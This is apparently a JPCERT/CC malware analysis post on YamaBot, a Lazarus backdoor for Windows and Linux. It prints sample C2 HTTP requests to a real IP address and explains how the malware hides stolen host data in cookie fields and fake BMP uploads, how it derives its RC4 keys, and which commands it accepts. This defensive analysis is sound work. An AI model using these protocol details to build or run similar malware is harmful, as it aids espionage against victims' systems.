YamaBot Malware Used by Lazarus
Lazarus

Email
JPCERT/CC is continuously investigating the activities by Lazarus. In 2021, JPCERT/CC
presented on its attack activities at CODE BLUE and HITCON.
https://github.com/JPCERTCC/Lazarus-research/
The YamaBot malware shared in the above research report targeted the Linux OS, but
another type recently found targets Windows OS. (It is referred to as Kaos in the document,
but this blog refers to it as YamaBot.) YamaBot is malware coded in Golang, with slightly
different functionality between types created for each platform. In addition to YamaBot,
Lazarus also created several other types of malware targeting multiple platforms, such as
VSingle. This article covers the details of YamaBot.

Overview of YamaBot
YamaBot malware communicates with C2 servers using HTTP requests. The following is a
list of function names included in the sample that targets Windows OS. It is the attacker that
named the malware as Yamabot. Those targeting Windows OS have functions specific to it,
such as creating and checking Mutex.

The following is a list of malware function names included in the sample targeting Linux OS.
The name kaos was used for it.

Figure 1 shows a part of the code to read configuration. The malware's configuration
includes RC4 keys. (See Appendix A for further information on the configuration). The
configuration has no difference depending on OS.

Figure 1: Code for reading configuration
The following sections describes YamaBot's communication methods and commands,
focusing on the differences between the Linux OS version and the Windows OS version.

Communication methods
YamaBot communicates with the C2 server using HTTP requests. The following is the first
HTTP POST request sent by YamaBot. Although it is a HTTP POST request, there is no data
to send. It is also unique in that the UserAgent is Base64-encoded.
POST /editor/session/aaa000/support.php HTTP/1.1
Host: 213.180.180.154
User-Agent:
TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSF
Connection: close
Content-Length: 0
Accept-Encoding: gzip

4/10

After successfully connecting to the C2 server, YamaBot sends the following request, which
includes information in its cookie header. The captcha_session contains a randomly
generated string and a RC4 key ([random characters (16 bytes)][RC4 key (16 bytes)][random
characters (4 bytes)]), Base64-encoded. The RC4 key is the first 16 bytes of the MD5 value
created from the following data.
Target Windows OS: hostname, username, MAC address
Target Linux OS: hostname, username
The captcha_val contains device information and the results of command execution,
RC4-encrypted and Base64-encoded.
POST /editor/session/aaa000/support.php HTTP/1.1
Host: 213.180.180.154
User-Agent:
TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSF
Connection: close
Content-Length: 0
Cookie: captcha_session=MTE5NzZmMTYwYzRlNTU4YjhhNDZhMTM4ZGMwNzgzNTNhNmUy;
captcha_val=W%2BIePQNeokInrSpb%2Fw1rTLAZvJAZQHmqAm2rXWdTsCvZ
Accept-Encoding: gzip

The first data sent by captcha_val is OS information and IP address. The following
contents are sent.
windows 6 amd64|[192.168.1.1]
linux 386|[192.168.1.1]

Furthermore, if the size of the data to be sent exceeds a certain size (check the examples of
3,333 bytes and 7,000 bytes), it is sent disguised as multi-part BMP data instead of
captcha_val .

The commands from the server are included in the Set-Cookie header. They are RC4encrypted and Base64-encoded and then included in the captcha_session as follows.
Note that the data sent by the malware is used as the RC4 key.
Set-Cookie: captcha_session=[Base64エンコードされた命令]

Command
The malware executes certain commands sent from its C2 server, and they are largely
different depending on target OS. Those targeting Linux OS can only execute shell
commands by /bin/sh. On the other hand, those targeting Windows OS have multiple
commands implemented as follows.
dir: Get the file list
Mapfs: Get the directory list
Download: Download file
Info: Send file path and PID
Sleep: Change sleep time
Uninstall: Delete itself
i: Change interval time
Others: Execute a given string with shell command
The command is in the form of [command][command parameters] , and the first half
includes the above command.
When the command i is executed, the execution result is sent including German language
as follows. The reason why German language is included in YamaBot is unknown.

In closing
YamaBot malware is still used by attackers. Since it targets not only Windows OS but also
Linux OS, servers should also be carefully investigated during incident investigation.
Attention should continuously paid as attacks by Lazarus have been confirmed in Japan.
Another type of malware used by Lazarus will be covered in the next issue.
